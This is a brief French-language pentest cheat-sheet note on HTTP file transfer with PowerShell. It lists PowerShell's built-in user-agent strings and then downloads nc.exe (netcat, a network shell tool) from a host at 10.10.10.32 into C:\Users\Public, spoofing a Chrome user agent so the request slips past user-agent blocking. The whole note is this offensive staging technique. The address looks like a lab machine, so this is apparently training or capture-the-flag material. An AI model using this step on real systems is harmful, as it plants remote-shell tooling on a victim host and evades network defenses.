# HTTP
useragent peut être bloqué. Utiliser un user agent commun

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
#Lister
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
iwr http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
